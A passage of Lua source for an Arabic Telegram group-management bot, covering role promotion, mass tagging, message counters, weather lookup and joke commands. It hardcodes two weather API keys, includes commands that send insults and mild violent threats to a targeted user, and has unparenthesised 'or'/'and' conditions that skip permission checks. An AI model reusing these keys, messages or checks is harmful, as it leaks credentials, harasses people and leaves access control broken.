faederdx(msg.chat_id_, msg.id_, 1, '↫ تم تفعيل امر اطردني ', 1, 'md')
end end
--     By Developer Faeder     -- 
if text:match("^نزلني$") and faeder11(msg) then
if not faederdx1:get(FAEDER.."lock_delme"..msg.chat_id_) then
faederdx1:set(FAEDER..'yesdel'..msg.sender_user_id_..'', 'delyes')
faederdx1:set(FAEDER..'nodel'..msg.sender_user_id_..'', 'delno')
faederdx(msg.chat_id_, msg.id_, 1, "↫ هل انت متأكد من تنزيلك \n↫ ارسل *{ نعم }* ليتم الامر \n↫ ارسل *{ لا }* لالغاء الامر ", 1, "md")
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ هذه هذه الخاصيه معطله ', 1, 'md')
end end
local delme = faederdx1:get(FAEDER..'yesdel'..msg.sender_user_id_..'')
if delme == 'delyes' then
if text:match("^نعم$") then
local delme = faederdx1:get(FAEDER..'yesdel'..msg.sender_user_id_..'')
if delme == 'delyes' then
if faederdx1:sismember(FAEDER..'bot:monsh:'..msg.chat_id_, msg.sender_user_id_) then
monsh = 'المنشئين الاساسيين ' else monsh = '' end 
if faederdx1:sismember(FAEDER..'bot:monsh2:'..msg.chat_id_, msg.sender_user_id_) then
monsh2 = 'المنشئين ' else monsh2 = '' end 
if faederdx1:sismember(FAEDER..'bot:owners:'..msg.chat_id_, msg.sender_user_id_) then
owner = 'المدراء ' else owner = '' end
if faederdx1:sismember(FAEDER..'bot:momod:'..msg.chat_id_, msg.sender_user_id_) then
momod = 'الادمنيه ' else momod = '' end
if faederdx1:sismember(FAEDER..'bot:vipmem:'..msg.chat_id_, msg.sender_user_id_) then
vipmem = 'المميزين ' else vipmem = '' end
if faederdx1:sismember(FAEDER..'bot:donky:'..msg.chat_id_, msg.sender_user_id_) then
donky = 'الحمير ' else donky = '' end 
if faederdx1:sismember(FAEDER..'bot:monsh:'..msg.chat_id_, msg.sender_user_id_) or faederdx1:sismember(FAEDER..'bot:owners:'..msg.chat_id_, msg.sender_user_id_) or faederdx1:sismember(FAEDER..'bot:momod:'..msg.chat_id_, msg.sender_user_id_) or faederdx1:sismember(FAEDER..'bot:vipmem:'..msg.chat_id_, msg.sender_user_id_) or faederdx1:sismember(FAEDER..'bot:donky:'..msg.chat_id_, msg.sender_user_id_) then
faederdx1:srem(FAEDER..'bot:monsh:'..msg.chat_id_,msg.sender_user_id_)
faederdx1:srem(FAEDER..'bot:monsh2:'..msg.chat_id_,msg.sender_user_id_)
faederdx1:srem(FAEDER..'bot:owners:'..msg.chat_id_,msg.sender_user_id_)
faederdx1:srem(FAEDER..'bot:momod:'..msg.chat_id_,msg.sender_user_id_)
faederdx1:srem(FAEDER..'bot:vipmem:'..msg.chat_id_,msg.sender_user_id_)
faederdx1:srem(FAEDER..'bot:donky:'..msg.chat_id_,msg.sender_user_id_) 
faederdx1:del(FAEDER..'yesdel'..msg.sender_user_id_..'', 'delyes') 
faederdx1:del(FAEDER..'nodel'..msg.sender_user_id_..'', 'delno')
faederdx(msg.chat_id_, msg.id_, 1, "↫ تم تنزيلك من \n ( "..monsh..''..monsh2..''..owner..''..momod..''..vipmem..''..donky.." )  \n", 1, "md")
else 
faederdx1:del(FAEDER..'yesdel'..msg.sender_user_id_..'', 'delyes') 
faederdx1:del(FAEDER..'nodel'..msg.sender_user_id_..'', 'delno')
faederdx(msg.chat_id_, msg.id_, 1, "↫ ليس لديك اي رتبه هنا ", 1, "md")
end end end
if text:match("^لا$") then
local notdelme = faederdx1:get(FAEDER..'nodel'..msg.sender_user_id_..'')
if notdelme == 'delno' then
faederdx1:del(FAEDER..'yesdel'..msg.sender_user_id_..'', 'delyes')
faederdx1:del(FAEDER..'nodel'..msg.sender_user_id_..'', 'delno')
faederdx(msg.chat_id_, msg.id_, 1, "↫ تم الغاء تنزيلك ", 1, "md")
end end end   
--     By Developer Faeder     -- 
if text == 'تعطيل نزلني' and is_monsh(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then
if not faederdx1:get(FAEDER.."lock_delme"..msg.chat_id_) then
faederdx1:set(FAEDER.."lock_delme"..msg.chat_id_, true)
faederdx(msg.chat_id_, msg.id_, 1, '↫ اهلا عزيزي '..renk_faeder(msg)..' \n↫ تم تعطيل امر نزلني ', 1, 'md')
end end
if text == 'تفعيل نزلني' and is_monsh(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then
if faederdx1:get(FAEDER.."lock_delme"..msg.chat_id_) then
faederdx1:del(FAEDER.."lock_delme"..msg.chat_id_)
faederdx(msg.chat_id_, msg.id_, 1, '↫ اهلا عزيزي '..renk_faeder(msg)..' \n↫ تم تفعيل امر نزلني ', 1, 'md')
end end
--     By Developer Faeder     -- 
--     By Developer Faeder     -- 
if text == "all" or text == "@all" or text == "تاك للكل" or text == "تاك الكل" and is_owner(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then if faederdx1:get(FAEDER..'bot:lock_tag'..msg.chat_id_) then faederdx(msg.chat_id_, msg.id_, 1, '↫ هذا الامر معطل ', 1, 'md') else if faederdx1:get(FAEDER.."taagall"..msg.chat_id_..':'..msg.sender_user_id_) then return faederdx(msg.chat_id_, msg.id_, 1, "↫ انتظر لا يمكن عمل تاك قبل انتهاء 5 دقائق للتاك السابق", 1, 'md') end faederdx1:setex(bot_id..'taagall'..msg.chat_id_..':'..msg.sender_user_id_,300,true) tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub('-100','')},function(dx,faeder)  tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = faeder.member_count_},function(dxx,faederr) x = 0 tags = 0 local list = faederr.members_ for k, v in pairs(list) do tdcli_function({ID="GetUser",user_id_ = v.user_id_},function(arg,data) if x == 5 or x == tags or k == 0 then tags = x + 5 t = "#all" end x = x + 1 taagall = data.first_name_ taagall = taagall:gsub("]","") taagall = taagall:gsub("[[]","") t = t.."\n ["..taagall.."](tg://user?id="..v.user_id_..")" if x == 5 or x == tags or k == 0 then local Text = t:gsub('#all,','#all\n') sendText(msg.chat_id_,Text,0,'md') end end,nil) end end,nil) end,nil) end end
--     By Developer Faeder     -- 
if text:match("^all (.*)$") and is_owner(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then local txt = {string.match(text, "^(all) (.*)$")} if faederdx1:get(FAEDER..'bot:lock_geam'..msg.chat_id_) then faederdx(msg.chat_id_, msg.id_, 1, '↫ هذا الامر معطل ', 1, 'md') end if faederdx1:get(FAEDER.."taagall"..msg.chat_id_..':'..msg.sender_user_id_) then return faederdx(msg.chat_id_, msg.id_, 1, "↫ انتظر لا يمكن عمل تاك قبل انتهاء 5 دقائق للتاك السابق", 1, 'md') end faederdx1:setex(FAEDER..'taagall'..msg.chat_id_..':'..msg.sender_user_id_,300,true) tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub('-100','')},function(dx,faeder) tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = faeder.member_count_},function(dxx,faederr) x = 0 tags = 0 local list = faederr.members_ for k, v in pairs(list) do tdcli_function({ID="GetUser",user_id_ = v.user_id_},function(arg,data) if x == 5 or x == tags or k == 0 then tags = x + 5 t = "#all "..txt[2].."\n\n" end x = x + 1 taagall = data.first_name_ taagall = taagall:gsub("]","") taagall = taagall:gsub("[[]","") t = t..", ["..taagall.."](tg://user?id="..v.user_id_..")" if x == 5 or x == tags or k == 0 then local Text = t:gsub('#all,','#all\n') sendText(msg.chat_id_,Text,0,'md') end end,nil) end end,nil) end,nil) end
--     By Developer Faeder     -- 
if text:match("^@all (.*)$") and is_owner(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then local txt = {string.match(text, "^(@all) (.*)$")} if faederdx1:get(FAEDER..'bot:lock_geam'..msg.chat_id_) then faederdx(msg.chat_id_, msg.id_, 1, '↫ هذا الامر معطل ', 1, 'md') else if faederdx1:get(FAEDER.."taagall"..msg.chat_id_..':'..msg.sender_user_id_) then return faederdx(msg.chat_id_, msg.id_, 1, "↫ انتظر لا يمكن عمل تاك قبل انتهاء 5 دقائق للتاك السابق", 1, 'md') end faederdx1:setex(FAEDER..'taagall'..msg.chat_id_..':'..msg.sender_user_id_,300,true) tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub('-100','')},function(dx,faeder) tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = faeder.member_count_},function(dxx,faederr) x = 0 tags = 0 local list = faederr.members_ for k, v in pairs(list) do tdcli_function({ID="GetUser",user_id_ = v.user_id_},function(arg,data) if x == 5 or x == tags or k == 0 then tags = x + 5 t = "#all "..txt[2].."\n\n" end x = x + 1 taagall = data.first_name_ taagall = taagall:gsub("]","") taagall = taagall:gsub("[[]","") t = t..", ["..taagall.."](tg://user?id="..v.user_id_..")" if x == 5 or x == tags or k == 0 then local Text = t:gsub('#all,','#all\n') sendText(msg.chat_id_,Text,0,'md') end end,nil) end end,nil) end,nil) end end
--     By Developer Faeder     --
if text == 'القروبات' and is_admin(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then 
local faeder = faederdx1:scard(FAEDER.."bot:groups")
local dx = faederdx1:scard("faeder:addg"..bot_id) or 0 
local users = faederdx1:scard(FAEDER.."bot:userss")
faederdx(msg.chat_id_, msg.id_, 1, '↫ *اعضاء الخاص { '..users..' }\n↫ عدد قروبات { '..faeder..' }\n↫ القروبات المفعله { '..dx..' }\n↫ الغير مفعله {'..(faeder - dx)..'} *', 1, 'md')
end
--     By Developer Faeder     -- 
if text:match("^رسائلي$") and msg.reply_to_message_id_ == 0  and faeder11(msg) then
local user_msgs = faederdx1:get(FAEDER..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
local faeder = faederdx1:get(FAEDER..'user:msgs'..bot_id..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local faedery = (faederdx1:get('faeder:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)
faederdx(msg.chat_id_, msg.id_, 1, "↫ اهلا وسهلا عزيزي \n↫ رسائلك الحقيقيه {*"..user_msgs.." }* \n↫ رسائلك المضافه {*"..faedery.." }* \n↫ رسائلك اليوم {"..(faeder).."} *\n↫ مجموع رسائلك {*"..(user_msgs + faedery).." }* \n↫ في المجموعه ", 1, 'md')
end
--     By Developer Faeder     -- 
if text:match("^ايدي المجموعه$") and faeder11(msg) then
faederdx(msg.chat_id_, msg.id_, 1, "↫ ايدي المجموعه `"..msg.chat_id_.."`", 1, 'md') 
end
--     By Developer Faeder     -- 
if text:match("^ايديي$") and faeder11(msg) then 
faederdx(msg.chat_id_, msg.id_, 1,'↫ اهلا بك عزيزي  '..renk_faeder(msg)..' \n↫ ايديك هو `'..msg.sender_user_id_..'`', 1, 'md') 
end
--     By Developer Faeder     -- 
if text:match("^معرفي$")  and faeder11(msg) then
function get_username(extra,result,success)
text = '↫ معرفك {User}'
local text = text:gsub('{User}',('@'..result.username_ or ''))
faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
getUser(msg.sender_user_id_,get_username)
end
--     By Developer Faeder     -- 
if text:match("^بايو$")  and faeder11(msg) then
function get_username(extra,result,success)
text = '↫ البايو حقك {User}'
local text = text:gsub('{User}',('@'..result.username_ or ''))
faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
getUser(msg.sender_user_id_,get_username)
end
--     By Developer Faeder     -- 
if text:match("^اسمي$") and faeder11(msg) then
function get_firstname(extra,result,success)
text = '↫ اسمك {firstname}'
local text = text:gsub('{firstname}',(result.first_name_ or ''))
faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
getUser(msg.sender_user_id_,get_firstname)
end   
--     By Developer Faeder     -- 
if text:match('^الحساب (%d+)$') and faeder11(msg) then
local id = text:match('^الحساب (%d+)$')
local text = 'اضغط لمشاهده العضو ↫ '
tdcli_function ({ID="SendMessage", chat_id_=msg.chat_id_, reply_to_message_id_=msg.id_, disable_notification_=0, from_background_=1, reply_markup_=nil, input_message_content_={ID="InputMessageText", text_=text, disable_web_page_preview_=1, clear_draft_=0, entities_={[0] = {ID="MessageEntityMentionName", offset_=0, length_=19, user_id_=id}}}}, dl_cb, nil)
end
--     By Developer Faeder     -- 
if text:match("^رابط حذف$") or text:match("^رابط الحذف$") or text:match("^اريد رابط الحذف$") or  text:match("^شمرلي رابط الحذف$") or text:match("^اريد رابط حذف$") and faeder11(msg) then
 local inline = {{{text="- رابط الحذف",url="https://telegram.org/deactivate"}}}
send_inline(msg.chat_id_,'↫ فكر زين قبل لا تحذف عمري \n↫ لحذف حسابك اضغط على الزر  .',nil,inline) 
return false 
end 
--     By Developer Faeder     -- 
if text:match("^السورس$") or text:match("^سورس$") and faeder11(msg) then 
local inline = {
{{text="- 𝘊𝘩𝘢𝘯𝘯𝘦𝘭 𝘚𝘰𝘶𝘳𝘤𝘦 .",url="https://t.me/badboy_here"}},
}
send_inline(msg.chat_id_,'- [𝘋𝘦𝘷 𝘴𝘰𝘶𝘳𝘤𝘦 𝘚𝘶𝘬𝘢𝘪𝘳𝘰](https://t.me/L7_L1) .\n- [𝘋𝘦𝘷 𝘴𝘰𝘶𝘳𝘤𝘦 𝘓𝘢𝘬𝘴𝘪𝘴 .](https://t.me/bzzzw) .',nil,inline) 
return false 
end
--     By Developer Faeder     -- 
if text:match("^جهاتي$") and faeder11(msg) then
add = (tonumber(faederdx1:get(FAEDER..'bot:user:add'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
faederdx(msg.chat_id_, msg.id_, 1, "↫ عدد الجهات الي ضفتها {"..add.."}*", 1, 'md')
end
--     By Developer Faeder     -- 
if text:match("^رسائلي اليوم$") and faeder11(msg) then 
local faeder = faederdx1:get(FAEDER..'user:msgs'..bot_id..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
faederdx(msg.chat_id_, msg.id_, 1, "↫ رسائلك اليوم *{"..(faeder).."} *", 1, 'md')
end
--     By Developer Faeder     -- 
if text:match("^[/!#]([Ww][Ee][Aa][Tt][Hh][Ee][Rr]) (.*)$") or text:match("^(طقس) (.*)$") and faeder11(msg) then
  MatchesEN = {text:match("^[/!#]([Ww][Ee][Aa][Tt][Hh][Ee][Rr]) (.*)$")}; MatchesFA = {text:match("^(طقس) (.*)$")}
  Ptrn = MatchesEN[2] or MatchesFA[2]
  local function temps(K)
   local F = (K*1.8)-459.67
   local C = K-273.15
   return F,C
  end
  local res = http.request("http://api.openweathermap.org/data/2.5/weather?q="..URL.escape(Ptrn).."&appid=269ed82391822cc692c9afd59f4aabba")
  local jtab = json:decode(res)
  if jtab.name then
   if jtab.weather[1].main == "Thunderstorm" then
    status = "⛈ عاصف"
   elseif jtab.weather[1].main == "Drizzle" then
    status = "🌦 امطار خفيفه"
   elseif jtab.weather[1].main == "Rain" then
    status = "🌧 مطر شديد"
   elseif jtab.weather[1].main == "Snow" then
    status = "🌨 مثلج"
   elseif jtab.weather[1].main == "Atmosphere" then
    status = "🌫 مغبر"
   elseif jtab.weather[1].main == "Clear" then
    status = "🌤️ صاف"
   elseif jtab.weather[1].main == "Clouds" then
    status = "☁️ غائم"
   elseif jtab.weather[1].main == "Extreme" then
     status = "-------"
   elseif jtab.weather[1].main == "Additional" then
    status = "-------"
   else
    status = "-------"
   end
   local F1,C1 = temps(jtab.main.temp)
   local F2,C2 = temps(jtab.main.temp_min)
   local F3,C3 = temps(jtab.main.temp_max)
   if jtab.rain then
    rain = jtab.rain["3h"].." ميليمتر"
   else
    rain = "-----"
   end
   if jtab.snow then
    snow = jtab.snow["3h"].." ميليمتر"
   else
    snow = "-----"
   end
   today = "• اسم المدينه : *"..jtab.name.."*\n"
   .."• اسم الدوله : *"..(jtab.sys.country or "----").."*\n"
   .."• درجه الحراره :\n"
   .."   "..C1.."° سلليزي\n"
   .."   "..F1.."° فهرنهايت\n"
   .."   "..jtab.main.temp.."° كلفن\n"
   .."• الجو "..status.." تقريبا\n\n"
   .."• درجه حراره اليوم الصغرى : C"..C2.."°   F"..F2.."°   K"..jtab.main.temp_min.."°\n"
   .."• درجه حراره اليوم الكبرى : C"..C3.."°   F"..F3.."°   K"..jtab.main.temp_max.."°\n"
   .."• رطوبة الهواء : "..jtab.main.humidity.."%\n"
   .."• كثافه الغيوم : "..jtab.clouds.all.."%\n"
   .."• سرعه الرياح : "..(jtab.wind.speed or "------").." متر / ثانيه\n"
   .."• اتجاه الرياح : "..(jtab.wind.deg or "------").."° درجه\n"
   .."• تقلب الرياح : "..(jtab.main.pressure/1000).."\n"
   .."• اخر 3 ساعات من المطر : "..rain.."\n"
   .."• اخر 3 ساعات من تساقط الثلوج : "..snow.."\n\n"
   after = ""
   local res = http.request("http://api.openweathermap.org/data/2.5/weather?q="..URL.escape(Ptrn).."&appid=de8f6f3e0b7f8a36a3e05f47418643bf")
   local jtab = json:decode(res)
   for i=1,5 do
    local F1,C1 = temps(jtab.list[i].main.temp_min)
    local F2,C2 = temps(jtab.list[i].main.temp_max)
    if jtab.list[i].weather[1].main == "Thunderstorm" then
     status = "⛈ عاصف"
    elseif jtab.list[i].weather[1].main == "Drizzle" then
     status = "🌦 امطار خفيفه"
    elseif jtab.list[i].weather[1].main == "Rain" then
     status = "🌧 مطر شديد"
    elseif jtab.list[i].weather[1].main == "Snow" then
     status = "🌨 مثلج"
    elseif jtab.list[i].weather[1].main == "Atmosphere" then
     status = "🌫 مغبر"
    elseif jtab.list[i].weather[1].main == "Clear" then
     status = "🌤️صاف"
    elseif jtab.list[i].weather[1].main == "Clouds" then
     status = "☁️ غائم"
    elseif jtab.list[i].weather[1].main == "Extreme" then
     status = "-------"
    elseif jtab.list[i].weather[1].main == "Additional" then
     status = "-------"
    else
     status = "-------"
    end
    if i == 1 then
     day = "• طقس يوم غد"
    elseif i == 2 then
     day = "• طقس بعد غد"
    elseif i == 3 then
     day = "• طقس بعد 3 ايام"
    elseif i == 4 then
     day = "• طقس بعد 4 ايام"
    elseif i == 5 then
      day = "• طقس بعد 5 ايام"
    end
    after = after.."- "..day..status.."تقريبا \n🔺C"..C2.."°  *-*  F"..F2.."°\nC"..C1.."°  *-*  F"..F1.."°\n"
   end
   Text = today.."• حاله الطقس ل5 ايام القادمه 🔽:\n"..after
   faederdx(msg.chat_id_, msg.id_, 1, Text, 1, 'md')
  else
   Text  = "• لا توجد مدينه بهذا الاسم 🌐"
   faederdx(msg.chat_id_, msg.id_, 1, Text, 1, 'md')
  end end
--     By Developer Faeder     -- 
if (msg.sender_user_id_) then
local text = msg.content_.text_:gsub("[Pp]rice", "Nerkh")
if text:match("^المطور$") and faeder11(msg) then
local nerkh = faederdx1:get(FAEDER.."nerkh")
if nerkh then
faederdx(msg.chat_id_, msg.id_, 1, nerkh, 1, "md")
elseif faederdx1:get(FAEDER.."lang:gp:" .. msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, "↫ Bot not found ", 1, "md")
else
faederdx(msg.chat_id_, msg.id_, 1, "- 𝐓𝐨 𝐂𝐨𝐧𝐭𝐢𝐧𝐮𝐞 𝐖𝐢𝐭𝐡 𝐓𝐡𝐞 𝐁𝐨𝐭 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫  𖠂\n\n- 𝗦𝘂𝗱𝗼 𖠙 @"..SudoFaeder..",", 1, "md")
end end end 
--     By Developer Faeder     -- 
if text and text:match('^امحطه @(.*)') and faeder11(msg) then 
local username = text:match('^امحطه @(.*)') 
function faeder(extra,result,success)
if result.id_ then  
if tonumber(result.id_) == tonumber(bot_id) then  
faederdx(msg.chat_id_, msg.id_, 1, 'لاتصير غبي يرحم اهلك كيف امحط نفسي ؟', 1, 'md') 
return false 
end  
if tonumber(result.id_) == tonumber(bot_owner) then 
faederdx(msg.chat_id_, msg.id_, 1, 'غبي انت مالك السورس ذا !', 1, 'md') 
return false  
end  
if tonumber(result.id_) == tonumber(1769776049) then 
faederdx(msg.chat_id_, msg.id_, 1, 'ذا مطور السورس لو اتفل عليه وقفني يرجال', 1, 'md') 
return false  
end  
if faederdx1:sismember(FAEDER.."bot:monsh:"..msg.chat_id_,result.id_) then
faederdx(msg.chat_id_, msg.id_, 1, 'دزمها بس ذا مالك السورس المنشى', 1, 'md') 
return false
end 
local faeder = "تم ي بعدي" 
faederdx(msg.chat_id_, msg.id_, 1,faeder, 1, 'md') 
local faeder = {"اذا مااحترمت نفسك بضربك واخلي الاطباء عاجزين عن علاجك","بسم الله نطلع الرشاش","بعطيك ","على قفاك","اهجد يورع"}
faederdx(msg.chat_id_, result.id_, 1,''..faeder[math.random(#faeder)]..'', 1, 'html') 
else  
faederdx(msg.chat_id_, msg.id_, 1, '↫ عذرا عزيزي بس الشخص ذا مهو بلمجموعه', 1, 'md') 
end end
resolve_username(username,faeder)
end
--     By Developer Faeder     -- 
if text:match("^امحطه$") or text:match("^اقين امحطه$") or text:match("^امحطه بعد$") or text:match("^اقولك امحطه$") or text:match("^امحطها$") or text:match("^امحطهه$") then
function hena(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then 
faederdx(msg.chat_id_, msg.id_, 1, 'لاتصير غبي يرحم اهلك كيف امحط نفسي ؟', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(bot_owner) then  
faederdx(msg.chat_id_, msg.id_, 1, 'غبي انت مالك السورس ذا !', 1, 'md') 
return false
end 
if tonumber(result.sender_user_id_) == tonumber(1769776049) then  
faederdx(msg.chat_id_, msg.id_, 1, 'ذا مطور السورس لو اتفل عليه وقفني يرجال', 1, 'md') 
return false
end 
if faederdx1:sismember(FAEDER.."bot:monsh:"..msg.chat_id_,result.sender_user_id_) then
faederdx(msg.chat_id_, msg.id_, 1, 'دزمها بس ذا مالك السورس المنشى', 1, 'md') 
return false
end 
local faeder = "تم ي عمري" 
faederdx(msg.chat_id_, msg.id_, 1,faeder, 1, 'md') 
local faeder = {"شفيك على خوينا يحيوان تبي امحطك ها ؟","حظر عام القم يلا","بمشيها لك هالمره بس المره الجايه مابتمشي على خير فاهم؟","شبمك ؟","استرجل عشان ماالعن شكلك 🤒🤙"} 
faederdx(msg.chat_id_, result.id_, 1,''..faeder[math.random(#faeder)]..'', 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),hena)   
end end
--     By Developer Faeder     -- 
if text:match("^بوسها$") or text:match("^بعد بوسها$") or text:match("^ضل بوس$") or text:match("^بوسها بعد$") or text:match("^بوسهه$") then
function bosha(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then 
faederdx(msg.chat_id_, msg.id_, 1, ' بس فهمني شون ابوس نفسي وتدلل 🤭😹', 1, 'md')
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(bot_owner) then  
faederdx(msg.chat_id_, msg.id_, 1, 'مواححح احلى بوسةه المطوري😻🔥💗 @'..SudoFaeder, 1, 'html')
return false
end 
local faeder = "تم ي عيني " 
faederdx(msg.chat_id_, msg.id_, 1,faeder, 1, 'md') 
local faeder = {"القم بوسه يشيخ","ختفو","كم تدفع بس وابوسك","امح بوسه"} 
faederdx(msg.chat_id_, result.id_, 1,''..faeder[math.random(#faeder)]..'', 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),bosha)   
end end
--     By Developer Faeder     -- 
if text:match("^عطه بوسه$") or text:match("^عطه بعد$") or text:match("^بوسه$") or text:match("^بوسه بعد$") then
function bosh(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then 
faederdx(msg.chat_id_, msg.id_, 1, ' انت فهمني كيف ابوس نفسي وازهل', 1, 'md')
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(bot_owner) then  
faederdx(msg.chat_id_, msg.id_, 1, 'اطلق بوسه لاطلق مطور @'..SudoFaeder, 1, 'html')
return false
end 
local faeder = "تم ي عيني " 
faederdx(msg.chat_id_, msg.id_, 1,faeder, 1, 'md') 
local faeder = {"ابي اعطيك بوسه بس اخاف تزرقها","امممواح يعمري","ختفو "} 
faederdx(msg.chat_id_, result.id_, 1,''..faeder[math.random(#faeder)]..'', 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),bosh)   
end end
--     By Developer Faeder     -- 
-------- Set Sudo3
------------ردود متعدده-----------
if is_sudo(msg) then
if text ==('رفع Legend 🎖') or text ==('رفع مطور') or text ==('رفع Legend 🎖') and faeder11(msg) then
function sudo_reply(extra, result, success)
faederdx1:sadd(FAEDER..'bot:admins:',result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","↫ تم رفعه Legend 🎖  ")
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),sudo_reply)
end end 
if text and text:match('^رفع Legend 🎖 @(.*)') and faeder11(msg) then
local username = text:match('^رفع Legend 🎖 @(.*)')
function promreply(extra,result,success)
if result.id_ then
faederdx1:sadd(FAEDER..'bot:admins:',result.id_)
Send_Options(msg,result.id_,"reply","↫ تم رفعه Legend 🎖𓍢")
else 
faederdx(msg.chat_id_, msg.id_, 1, '*↫  المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
--     By Developer Faeder     -- 
-------- Rem Sudo3
if text ==('تنزيل Legend 🎖') or text ==('تنزيل Legend 🎖') or text ==('حذف مطور') and faeder11(msg) then
function prom_reply(extra, result, success)
faederdx1:srem(FAEDER..'bot:admins:',result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","↫ تم تنزيله من Legend 🎖,")
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل Legend 🎖 @(.*)') and faeder11(msg) then
local username = text:match('^تنزيل Legend 🎖 @(.*)')
function promreply(extra,result,success)
if result.id_ then
faederdx1:srem(FAEDER..'bot:admins:',result.id_)
Send_Options(msg,result.id_,"reply","↫ تم تنزيله من المطورين𓍢")
else 
faederdx(msg.chat_id_, msg.id_, 1, '*↫  المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end end
--     By Developer Faeder     -- 
-------- Set Onall
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text ==('رفع مدير عام') and faeder11(msg) then
function raf_reply(extra, result, success)
faederdx1:sadd(FAEDER..'bot:onall:',result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","↫ تم رفعه مدير عام𓍢")
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع مدير عام @(.*)') and faeder11(msg) then
local username = text:match('^رفع مدير عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
faederdx1:sadd(FAEDER..'bot:onall:',result.id_)
Send_Options(msg,result.id_,"reply","↫ تم رفعه مدير عام𓍢")
else 
faederdx(msg.chat_id_, msg.id_, 1, '*↫  المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end 
--     By Developer Faeder     -- 
-------- Rem Onall
if text ==('تنزيل مدير عام') and faeder11(msg) then
function prom_reply(extra, result, success)
faederdx1:srem(FAEDER..'bot:onall:',result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","↫ تم تنزيله من المدراء𓍢")
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مدير عام @(.*)') and faeder11(msg) then
local username = text:match('^تنزيل مدير عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
faederdx1:srem(FAEDER..'bot:onall:',result.id_)
Send_Options(msg,result.id_,"reply","↫ تم تنزيله من المدراء𓍢")
else 
faederdx(msg.chat_id_, msg.id_, 1, '*↫  المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end end
--     By Developer Faeder     -- 
-------- Set Moall
if is_onall(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then
if text ==('رفع ادمن عام') then
function raf_reply(extra, result, success)
faederdx1:sadd(FAEDER..'bot:moall:',result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","↫ تم رفعه ادمن عام𓍢")
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع ادمن عام @(.*)') and faeder11(msg) then
local username = text:match('^رفع ادمن عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
faederdx1:sadd(FAEDER..'bot:moall:',result.id_)
Send_Options(msg,result.id_,"reply","↫ تم رفعه ادمن عام𓍢")
else 
faederdx(msg.chat_id_, msg.id_, 1, '*↫  المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end 
--     By Developer Faeder     -- 
-------- Rem Moall
if text ==('تنزيل ادمن عام') and faeder11(msg) then
function prom_reply(extra, result, success)
faederdx1:srem(FAEDER..'bot:moall:',result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","↫ تم تنزيله من الادمنيه")
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل ادمن عام @(.*)') and faeder11(msg) then
local username = text:match('^تنزيل ادمن عام @(.*)')
